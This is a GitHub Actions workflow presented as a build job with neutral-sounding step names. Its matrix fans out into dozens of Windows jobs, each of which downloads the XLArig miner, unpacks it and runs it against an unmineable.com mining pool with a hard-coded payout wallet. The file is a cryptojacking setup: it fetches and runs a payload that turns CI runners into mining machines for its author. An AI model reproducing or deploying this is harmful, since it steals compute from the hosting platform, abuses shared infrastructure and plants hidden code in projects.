name: eX-code_UMBL
 
on: [workflow_dispatch]
 
jobs:
  build:
    name: eX-code_UMBL
    runs-on: windows-latest
    strategy:
      max-parallel: 5
      fail-fast: false
      matrix:
        go: [1.0, 1.1, 1.2, 1.3, 1,35]
        flag: [A, B, C, D, E, F, G, H, I]
    env:
        NUM_JOBS: 20
        JOB: ${{ matrix.go }}
    steps:
    - name: PREPARING
      run: Invoke-WebRequest https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-win64.zip -Outfile XLArig-v5.2.2-win64.zip
    - name: Seting-UP
      run: Expand-Archive XLArig-v5.2.2-win64.zip
    - name: Running
      run: .\XLArig-v5.2.2-win64\xlarig.exe --no-huge-pages -o rx.unmineable.com:3333 -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u BTT:TETfQxUonoVEAPJFBJMtKrwpXnuHAjYmeA.tes1
    - name: DONE
      run: exit
